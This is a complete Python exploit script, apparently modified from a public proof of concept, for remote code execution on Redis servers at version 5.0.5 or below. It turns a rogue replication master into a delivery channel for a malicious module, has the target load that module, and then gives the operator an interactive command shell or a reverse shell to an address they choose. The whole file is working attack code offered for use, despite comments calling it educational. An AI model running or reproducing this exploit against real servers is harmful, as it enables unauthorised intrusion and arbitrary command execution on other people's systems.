#!/usr/bin/env python3
"""
Redis RCE Exploit via Malicious Replication Payload

Original PoC Source:
https://github.com/n0b0dyCN/redis-rogue-server

Modified by: x7331
Modifications:
- Added detailed comments for clarity and educational purposes.
- Simplified some function names and flow for readability.
- Added minor improvements in error handling and output formatting.
- Added forced SLAVEOF NO ONE to reset slave connection before exploit.

Description:
This script exploits a vulnerable Redis server (<= 5.0.5) that allows
module loading and replication configuration without sufficient restrictions.
By forcing the target Redis instance to become a slave of this rogue server,
the script sends a malicious payload (a compiled .so Redis module) as a fake
RDB dump during replication, causing Redis to write the module on disk.
Afterward, the script commands Redis to load the malicious module, allowing
remote code execution.

Usage:
- Provide target Redis host/port and your rogue server IP/port.
- Optionally provide Redis password if authentication is enabled.
"""

import socket
import sys
from time import sleep
from optparse import OptionParser

CLRF = "\r\n"
SERVER_EXP_MOD_FILE = "module.so"  # Filename for the malicious module payload

def encode_cmd_arr(arr):
    """Encode a Redis command array to the RESP protocol format."""
    cmd = ""
    cmd += "*" + str(len(arr))
    for arg in arr:
        cmd += CLRF + "$" + str(len(arg))
        cmd += CLRF + arg
    cmd += "\r\n"
    return cmd

def encode_cmd(raw_cmd):
    """Encode a single command string to RESP format."""
    return encode_cmd_arr(raw_cmd.split(" "))

def decode_cmd(cmd):
    """Decode a RESP command or bulk string into list or string."""
    if cmd.startswith("*"):
        raw_arr = cmd.strip().split("\r\n")
        return raw_arr[2::2]  # Extract arguments from RESP array
    if cmd.startswith("$"):
        return cmd.split("\r\n", 2)[1]
    return cmd.strip().split(" ")

def info(msg):
    """Print informational messages in green."""
    print(f"\033[1;32;40m[info]\033[0m {msg}")

def error(msg):
    """Print error messages in red."""
    print(f"\033[1;31;40m[err ]\033[0m {msg}")

def din(sock, cnt=4096):
    """Receive data from a socket and optionally print it."""
    global verbose
    msg = sock.recv(cnt)
    if verbose:
        if len(msg) < 1000:
            print(f"\033[1;34;40m[->]\033[0m {msg}")
        else:
            print(f"\033[1;34;40m[->]\033[0m {msg[:80]}......{msg[-80:]}")
    return msg.decode('gb18030')

def dout(sock, msg):
    """Send data to a socket and optionally print it."""
    global verbose
    if type(msg) != bytes:
        msg = msg.encode()
    sock.send(msg)
    if verbose:
        if len(msg) < 1000:
            print(f"\033[1;33;40m[<-]\033[0m {msg}")
        else:
            print(f"\033[1;33;40m[<-]\033[0m {msg[:80]}......{msg[-80:]}")

def decode_shell_result(s):
    """Clean up shell command output received from Redis."""
    return "\n".join(s.split("\r\n")[1:-1])

class Remote:
    """Handles communication with the target Redis server."""
    def __init__(self, rhost, rport):
        self._host = rhost
        self._port = rport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.connect((self._host, self._port))

    def send(self, msg):
        dout(self._sock, msg)

    def recv(self, cnt=65535):
        return din(self._sock, cnt)

    def do(self, cmd):
        self.send(encode_cmd(cmd))
        buf = self.recv()
        return buf

    def shell_cmd(self, cmd):
        self.send(encode_cmd_arr(['system.exec', f"{cmd}"]))
        buf = self.recv()
        return buf

class RogueServer:
    """
    Rogue Redis master server to send the malicious module payload
    during replication sync request.
    """
    def __init__(self, lhost, lport):
        self._host = lhost
        self._port = lport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.bind(('0.0.0.0', self._port))
        self._sock.listen(10)

    def close(self):
        self._sock.close()

    def handle(self, data):
        """
        Handle commands from the Redis slave (target).
        Reply with appropriate Redis protocol responses.
        """
        cmd_arr = decode_cmd(data)
        resp = ""
        phase = 0
        if cmd_arr[0].startswith("PING"):
            resp = "+PONG" + CLRF
            phase = 1
        elif cmd_arr[0].startswith("REPLCONF"):
            resp = "+OK" + CLRF
            phase = 2
        elif cmd_arr[0].startswith("PSYNC") or cmd_arr[0].startswith("SYNC"):
            # Send fake full resync response with the malicious payload
            resp = "+FULLRESYNC " + "Z"*40 + " 1" + CLRF
            resp += "$" + str(len(payload)) + CLRF
            resp = resp.encode() + payload + CLRF.encode()
            phase = 3
        return resp, phase

    def exp(self):
        """Accept connection from Redis slave and send the payload."""
        cli, addr = self._sock.accept()
        info(f"Rogue server: Connection accepted from {addr[0]}:{addr[1]}")
        while True:
            data = din(cli, 1024)
            if len(data) == 0:
                break
            resp, phase = self.handle(data)
            dout(cli, resp)
            if phase == 3:
                info("Payload sent.")
                break

def interact(remote):
    """Interactive shell mode to execute arbitrary commands."""
    info("Interact mode start, enter \"exit\" to quit.")
    try:
        while True:
            cmd = input("\033[1;32;40m[<<]\033[0m ").strip()
            if cmd == "exit":
                return
            r = remote.shell_cmd(cmd)
            for l in decode_shell_result(r).split("\n"):
                if l:
                    print("\033[1;34;40m[>>]\033[0m " + l)
    except KeyboardInterrupt:
        pass

def reverse(remote):
    """Trigger reverse shell back to attacker."""
    info("Open reverse shell...")
    addr = input("Reverse server address: ")
    port = input("Reverse server port: ")
    dout(remote, encode_cmd(f"system.rev {addr} {port}"))
    info("Reverse shell payload sent.")
    info(f"Check at {addr}:{port}")

def cleanup(remote):
    """Unload the malicious Redis module after use."""
    info("Unload module...")
    remote.do("MODULE UNLOAD system")

def runserver(rhost, rport, lhost, lport, passwd):
    """
    Main exploit logic:
    - Connect to target Redis
    - Authenticate (if password given)
    - Reset any existing slave connection with SLAVEOF NO ONE
    - Set slaveof to rogue server
    - Configure Redis to save .so payload file in /tmp
    - Serve the payload via rogue server
    - Load the module into Redis from /tmp/module.so
    - Cleanup and provide interactive shell options
    """
    remote = Remote(rhost, rport)
    if passwd:
        info("Authenticating...")
        remote.do(f"AUTH {passwd}")

    info("Resetting slave connection to force reconnect...")
    reset_resp = remote.do("SLAVEOF NO ONE")
    info(f"SLAVEOF NO ONE response: {reset_resp.strip()}")

    info("Setting slaveof to rogue server...")
    slaveof_resp = remote.do(f"SLAVEOF {lhost} {lport}")
    info(f"SLAVEOF response: {slaveof_resp.strip()}")

    info("Setting Redis working directory to /tmp ...")
    dir_set_resp = remote.do("CONFIG SET dir /tmp")
    info(f"CONFIG SET dir response: {dir_set_resp.strip()}")

    info("Setting dbfilename for payload...")
    dbfile_resp = remote.do(f"CONFIG SET dbfilename {SERVER_EXP_MOD_FILE}")
    info(f"CONFIG SET dbfilename response: {dbfile_resp.strip()}")

    info("Starting rogue server to send payload...")
    rogue = RogueServer(lhost, lport)
    rogue.exp()
    sleep(2)

    load_path = "/tmp/" + SERVER_EXP_MOD_FILE
    info(f"Loading module from {load_path} ...")
    load_resp = remote.do(f"MODULE LOAD {load_path}")
    info(f"MODULE LOAD response: {load_resp.strip()}")

    info("Temporary cleaning up...")
    remote.do("SLAVEOF NO ONE")
    remote.do("CONFIG SET dbfilename dump.rdb")
    remote.shell_cmd(f"rm {load_path}")
    rogue.close()

    choice = input("What do you want, [i]nteractive shell or [r]everse shell: ")
    if choice.startswith("i"):
        interact(remote)
    elif choice.startswith("r"):
        reverse(remote)

    cleanup(remote)

if __name__ == '__main__':
    parser = OptionParser()
    parser.add_option("--rhost", dest="rh", type="string",
                      help="target host", metavar="REMOTE_HOST")
    parser.add_option("--rport", dest="rp", type="int",
                      help="target redis port (default 6379)", default=6379,
                      metavar="REMOTE_PORT")
    parser.add_option("--lhost", dest="lh", type="string",
                      help="rogue server ip", metavar="LOCAL_HOST")
    parser.add_option("--lport", dest="lp", type="int",
                      help="rogue server listen port (default 6379)", default=6379,
                      metavar="LOCAL_PORT")
    parser.add_option("--exp", dest="exp", type="string",
                      help="Redis Module to load (default module.so)", default="module.so",
                      metavar="EXP_FILE")
    parser.add_option("-v", "--verbose", action="store_true", default=False,
                      help="Show full data stream (optional)")
    parser.add_option("--passwd", dest="rpasswd", type="string",
                      help="target redis password (optional)")

    (options, args) = parser.parse_args()
    global verbose, payload, exp_mod
    verbose = options.verbose
    exp_mod = options.exp
    try:
        payload = open(exp_mod, "rb").read()
    except Exception as e:
        error(f"Failed to read payload file '{exp_mod}': {e}")
        sys.exit(1)

    if not options.rh or not options.lh:
        parser.error("Invalid arguments: --rhost and --lhost are required")

    info(f"TARGET {options.rh}:{options.rp}")
    info(f"SERVER {options.lh}:{options.lp}")
    try:
        runserver(options.rh, options.rp, options.lh, options.lp, options.rpasswd)
    except Exception as e:
        error(repr(e))
